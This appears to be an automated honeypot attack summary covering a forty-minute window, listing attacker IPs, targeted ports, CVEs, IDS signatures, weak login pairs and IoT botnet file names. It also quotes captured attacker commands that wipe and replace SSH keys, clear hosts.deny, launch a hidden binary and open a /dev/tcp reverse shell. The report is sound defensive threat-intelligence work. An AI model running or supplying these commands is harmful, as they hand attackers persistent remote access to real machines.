Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T22:01:34Z
**Timeframe:** 2025-10-14T21:20:01Z to 2025-10-14T22:00:01Z
**Files Used:**
* agg_log_20251014T212001Z.json
* agg_log_20251014T214001Z.json
* agg_log_20251014T220001Z.json

### Executive Summary
This report summarizes 27,023 malicious events recorded across the honeypot network. The majority of attacks targeted the Cowrie and Sentrypeer honeypots. The most frequent attacks originated from IP addresses 23.94.26.58 and 47.251.171.50. Attackers primarily targeted ports 5060 (SIP) and 22 (SSH). Several CVEs were exploited, and a variety of malicious commands were attempted, including data exfiltration and establishing reverse shells.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 7696
* Sentrypeer: 6393
* Honeytrap: 3955
* Redishoneypot: 2007
* Mailoney: 1684
* Suricata: 1656
* Ciscoasa: 1586
* Dionaea: 1543
* Heralding: 277
* ssh-rsa: 132
* H0neytr4p: 33
* Adbhoney: 23
* Tanner: 27
* ElasticPot: 10
* Honeyaml: 7
* ConPot: 6
* Miniprint: 3
* Dicompot: 3
* Ipphoney: 2

**Top Attacking IPs:**
* 23.94.26.58
* 47.251.171.50
* 206.191.154.180
* 185.243.5.146
* 176.65.141.119
* 86.54.42.238
* 41.236.74.31
* 176.233.30.180
* 8.213.30.120
* 185.243.5.148

**Top Targeted Ports/Protocols:**
* 5060
* 6379
* 25
* 22
* 445
* vnc/5900
* 5903
* TCP/1433

**Most Common CVEs:**
* CVE-2001-0414
* CVE-2002-0012
* CVE-2002-0013
* CVE-2006-3602
* CVE-2006-4458
* CVE-2006-4542
* CVE-2019-11500
* CVE-2021-44228
* CVE-2024-1709

**Commands Attempted by Attackers:**
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`
* `lockr -ia .ssh`
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
* `cat /proc/cpuinfo | grep name | wc -l`
* `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
* `uname -a`
* `whoami`
* `lscpu | grep Model`
* `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
* `Enter new UNIX password:`
* `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
* `chmod +x ./.565805366568205400/sshd;nohup ./.565805366568205400/sshd ...`
* `nohup bash -c "exec 6<>/dev/tcp/..."`

**Signatures Triggered:**
* ET DROP Dshield Block Listed Source group 1
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* ET SCAN NMAP -sS window 1024
* ET HUNTING RDP Authentication Bypass Attempt
* ET SCAN Suspicious inbound to MSSQL port 1433
* ET INFO Reserved Internal IP Traffic
* ET CINS Active Threat Intelligence Poor Reputation IP group 48
* ET CINS Active Threat Intelligence Poor Reputation IP group 49
* ET SCAN Potential SSH Scan
* ET INFO CURL User Agent
* ET VOIP Modified Sipvicious Asterisk PBX User-Agent

**Users / Login Attempts:**
* root/
* 345gs5662d34/345gs5662d34
* root/3245gs5662d34
* root/123@@@
* root/Qaz123qaz
* root/Password@2025

**Files Uploaded/Downloaded:**
* soap-envelope
* addressing
* discovery
* env:Envelope>
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass

**HTTP User-Agents:**
* (None observed in the logs)

**SSH Clients:**
* (None observed in the logs)

**SSH Servers:**
* (None observed in the logs)

**Top Attacker AS Organizations:**
* (None observed in the logs)

### Key Observations and Anomalies
* A significant number of commands attempted to download and execute malicious payloads via `/dev/tcp`, indicating attempts to establish reverse shells and download additional malware.
* The "mdrfckr" SSH key was repeatedly added to `authorized_keys`, a common tactic for maintaining persistent access.
* The presence of `arm.*.urbotnetisass` files suggests a campaign targeting IoT devices.
* The combination of SIP (5060) and SSH (22) as top targeted ports suggests a broad scanning and exploitation effort against common communication and management protocols.
